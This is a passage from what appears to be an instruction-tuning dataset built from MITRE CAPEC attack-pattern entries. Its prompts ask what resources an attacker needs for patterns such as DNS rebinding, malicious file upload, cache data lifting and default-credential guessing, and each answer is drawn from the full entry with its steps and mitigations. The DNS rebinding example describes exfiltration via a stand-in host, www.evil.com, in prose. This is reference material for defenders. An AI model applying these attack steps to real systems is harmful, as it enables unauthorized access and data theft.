          "xhtml:p": "This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users."
        },
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc."
        },
        "Resources_Required": {
          "Resource": "A client application, such as a web browser, or a scripting language capable of interacting with the target."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "287"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1548",
            "Entry_Name": "Abuse Elevation Control Mechanism"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-598",
            "@Section": "Testing for Bypassing Authentication Schema"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Using Malicious Files (CAPEC ID: 17), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAbility to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
      "@Name": "Using Malicious Files (CAPEC ID: 17)",
      "attack_ptrn": {
        "@ID": "17",
        "@Name": "Using Malicious Files",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "122",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "233"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.",
              "Technique": "Through shell access to a system, use the command \"ls -l\" to view permissions for files and directories."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.",
              "Technique": "Upload a malicious file through a misconfigured FTP server."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To identify and execute against an over-privileged system interface"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.",
            "Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Consider a directory on a web server with the following permissions",
              "This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "informative",
              "#text": "drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "272"
            },
            {
              "@CWE_ID": "59"
            },
            {
              "@CWE_ID": "282"
            },
            {
              "@CWE_ID": "270"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.005",
              "Entry_Name": "Hijack Execution Flow: Executable Installer File Permissions Weakness"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.010",
              "Entry_Name": "Hijack Execution Flow: Services File Permissions Weakness"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "Accessing, Modifying or Executing Executable Files"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: ICMP IP Total Length Field Probe (CAPEC ID: 331)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern ICMP IP Total Length Field Probe (CAPEC ID: 331):\nA tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\"",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\"",
      "@Name": "ICMP IP Total Length Field Probe (CAPEC ID: 331)",
      "attack_ptrn": {
        "@ID": "331",
        "@Name": "ICMP IP Total Length Field Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable\" error message. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.",
        "Extended_Description": {
          "xhtml:p": "RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart: 1) the IP total length field may be calculated correctly, 2) an operating system may add 20 or more additional bytes to the length calculation, 3) the operating system may subtract 20 or more bytes from the correct length of the field or 4) the IP total length field is calculated with any other incorrect value."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications. Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\""
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "204"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-262"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses, Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Create Malicious Client (CAPEC ID: 202)",
    "context": "",
    "output": "required resources:\nThe adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.",
      "@Name": "Create Malicious Client (CAPEC ID: 202)",
      "attack_ptrn": {
        "@ID": "202",
        "@Name": "Create Malicious Client",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures.",
        "Extended_Description": {
          "xhtml:p": [
            "For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality.",
            "For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance. Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit."
          ]
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "22",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary."
        },
        "Resources_Required": {
          "Resource": "The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "602"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: DNS Rebinding (CAPEC ID: 275)",
    "context": "",
    "output": "The resources required to execute DNS Rebinding (CAPEC ID: 275) are the following: The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.",
      "@Name": "DNS Rebinding (CAPEC ID: 275)",
      "attack_ptrn": {
        "@ID": "275",
        "@Name": "DNS Rebinding",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary.",
        "Extended_Description": {
          "xhtml:p": "Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the adversary identifies, additional attacks are possible. This attack differs from pharming attacks in that the adversary is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "194",
            "Exclude_Related": [
              {
                "@Exclude_ID": "515"
              },
              {
                "@Exclude_ID": "403"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.",
              "Technique": "Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Access & exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.",
              "Technique": [
                "Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.",
                "Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary's DNS name after initial contact."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Setup DNS server and the adversary's web server. Write a malicious script to allow the victim to connect to the web server."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately, this is incompatible with the design of some legitimate sites.",
            "Implementation: Reject HTTP request with a malicious Host header.",
            "Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses."
          ]
        },
        "Example_Instances": {
          "Example": "The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to their own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "350"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-119"
            },
            {
              "@External_Reference_ID": "REF-120",
              "@Section": "DNS rebinding"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload, Related_Attack_Patterns, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Lifting Sensitive Data Embedded in Cache (CAPEC ID: 204), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.",
      "@Name": "Lifting Sensitive Data Embedded in Cache (CAPEC ID: 204)",
      "attack_ptrn": {
        "@ID": "204",
        "@Name": "Lifting Sensitive Data Embedded in Cache",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "167"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.",
              "Technique": [
                "Use probing tools to look for application cache files on a machine.",
                "Use a web application and determine if any sensitive information is stored in browser cache."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.",
              "Technique": [
                "Use priviledge escalation to access cache files that might have strict privileges.",
                "If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.",
              "Technique": "Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target application must store sensitive information in a cache.",
            "The cache must be inadequately protected against attacker access."
          ]
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "524"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "1239"
            },
            {
              "@CWE_ID": "1258"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1005",
            "Entry_Name": "Data from Local System"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Lifting cached, sensitive data embedded in client distributions (thick or thin)"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Try Common or Default Usernames and Passwords (CAPEC ID: 70)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Try Common or Default Usernames and Passwords (CAPEC ID: 70):\nTechnology or vendor specific list of default usernames and passwords.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Technology or vendor specific list of default usernames and passwords.",
      "@Name": "Try Common or Default Usernames and Passwords (CAPEC ID: 70)",
      "attack_ptrn": {
        "@ID": "70",
        "@Name": "Try Common or Default Usernames and Passwords",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. \"secret\" or \"password\") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Prerequisites": {
